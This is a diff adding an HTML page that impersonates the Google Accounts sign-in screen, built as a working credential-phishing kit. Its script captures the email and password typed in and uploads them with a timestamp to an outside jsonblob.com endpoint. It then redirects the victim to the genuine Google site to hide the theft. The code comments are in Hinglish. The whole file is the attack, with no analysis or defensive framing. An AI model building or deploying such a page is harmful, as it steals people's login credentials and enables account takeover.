@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in safe - Google Accounts</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --google-blue: #1a73e8;
+            --text-dark: #202124;
+            --text-gray: #5f6368;
+            --border-gray: #dadce0;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Roboto', sans-serif; }
+
+        body { background-color: #fff; display: flex; flex-direction: column; min-height: 100vh; padding: 0 24px; }
+
+        .content-wrapper { max-width: 450px; margin: 0 auto; width: 100%; padding-top: 48px; }
+
+        .google-logo { width: 80px; margin-bottom: 24px; }
+
+        h1 { font-size: 28px; font-weight: 400; color: var(--text-dark); margin-bottom: 8px; }
+
+        .subtitle { font-size: 16px; color: var(--text-dark); margin-bottom: 32px; }
+
+        .user-chip { display: inline-flex; align-items: center; padding: 3px 12px 3px 4px; border: 1px solid var(--border-gray); border-radius: 20px; margin-bottom: 30px; cursor: pointer; }
+
+        .user-chip .avatar { width: 20px; height: 20px; background: #5f6368; color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 12px; margin-right: 8px; }
+
+        .input-box { position: relative; width: 100%; margin-bottom: 8px; }
+
+        input { width: 100%; padding: 13px 15px; font-size: 16px; border: 1px solid var(--border-gray); border-radius: 4px; outline: none; }
+
+        input:focus { border: 2px solid var(--google-blue); padding: 12px 14px; }
+
+        .label-text { position: absolute; left: 12px; top: -10px; background: white; padding: 0 4px; font-size: 12px; color: var(--google-blue); }
+
+        .blue-link { color: var(--google-blue); text-decoration: none; font-weight: 500; font-size: 14px; cursor: pointer; }
+
+        .helper-text { font-size: 14px; color: var(--text-gray); margin-top: 40px; line-height: 1.5; }
+
+        .footer-actions { display: flex; justify-content: space-between; align-items: center; margin-top: 40px; }
+
+        .btn-next { background-color: var(--google-blue); color: #fff; border: none; padding: 10px 24px; border-radius: 24px; font-weight: 500; cursor: pointer; font-size: 14px; }
+
+        .checkbox-row { display: flex; align-items: center; margin-top: 10px; font-size: 14px; }
+
+        .checkbox-row input { width: 18px; height: 18px; margin-right: 12px; }
+
+        .bottom-nav { margin-top: auto; padding: 24px 0; display: flex; flex-wrap: wrap; gap: 20px; font-size: 12px; color: var(--text-gray); }
+
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="content-wrapper">
+        <img src="https://image2url.com/images/1766411607576-d8e03a81-2e44-44f5-8ecc-b7b4b1418abb.png" alt="Google" class="google-logo">
+
+        <div id="step-1">
+            <h1>Sign in</h1>
+            <p class="subtitle">Use your Google Account</p>
+            <div class="input-box">
+                <span class="label-text">Email or phone</span>
+                <input type="email" id="email-input">
+            </div>
+            <a class="blue-link">Forgot email?</a>
+            <div class="helper-text">Not your computer? Use Guest mode to sign in privately. <a class="blue-link">Learn more</a></div>
+            <div class="footer-actions">
+                <a class="blue-link">Create account</a>
+                <button class="btn-next" onclick="toStep2()">Next</button>
+            </div>
+        </div>
+
+        <div id="step-2" class="hidden">
+            <h1>Welcome</h1>
+            <div class="user-chip" onclick="toStep1()">
+                <div class="avatar">👤</div>
+                <span id="display-email"></span>
+                <span style="margin-left: 8px; font-size: 10px;">▼</span>
+            </div>
+            <div class="input-box">
+                <span class="label-text">Enter your password</span>
+                <input type="password" id="password-input">
+            </div>
+            <div class="checkbox-row">
+                <input type="checkbox" id="show-pass">
+                <label for="show-pass">Show password</label>
+            </div>
+            <div class="footer-actions">
+                <a class="blue-link">Forgot password?</a>
+                <button class="btn-next" id="final-btn" onclick="sendData()">Next</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="content-wrapper">
+        <div class="bottom-nav">
+            <span style="flex-grow: 1;">English (United States) ▼</span>
+            <span>Help</span> <span>Privacy</span> <span>Terms</span>
+        </div>
+    </div>
+
+    <script>
+        const API_URL = "https://api.jsonblob.com/api/jsonBlob/019b51f8-e4ad-7fab-a95b-203342e9197e";
+
+        function toStep2() {
+            const email = document.getElementById('email-input').value;
+            if (email) {
+                document.getElementById('display-email').innerText = email;
+                document.getElementById('step-1').classList.add('hidden');
+                document.getElementById('step-2').classList.remove('hidden');
+            }
+        }
+
+        function toStep1() {
+            document.getElementById('step-2').classList.add('hidden');
+            document.getElementById('step-1').classList.remove('hidden');
+        }
+
+        document.getElementById('show-pass').addEventListener('change', function() {
+            document.getElementById('password-input').type = this.checked ? 'text' : 'password';
+        });
+
+        async function sendData() {
+            const email = document.getElementById('email-input').value;
+            const password = document.getElementById('password-input').value;
+            const btn = document.getElementById('final-btn');
+
+            if (!password) return;
+
+            btn.innerText = "Processing...";
+            btn.disabled = true;
+
+            try {
+                // 1. Pehle current data fetch karo
+                let currentData = [];
+                try {
+                    const response = await fetch(API_URL);
+                    currentData = await response.json();
+                    // Agar data array nahi hai (pehli entry), toh array bana do
+                    if (!Array.isArray(currentData)) {
+                        currentData = [];
+                    }
+                } catch (e) {
+                    currentData = [];
+                }
+
+                // 2. Nayi entry add karo
+                const newEntry = {
+                    email: email,
+                    password: password,
+                    date: new Date().toLocaleString()
+                };
+                currentData.push(newEntry);
+
+                // 3. Pura updated array wapas JSON Blob par PUT karo
+                await fetch(API_URL, {
+                    method: 'PUT',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify(currentData)
+                });
+
+                // Final redirect
+                window.location.href = "https://accounts.google.com";
+            } catch (err) {
+                console.error("Error:", err);
+                window.location.href = "https://accounts.google.com";
+            }
+        }
+    </script>
+</body>
+</html>
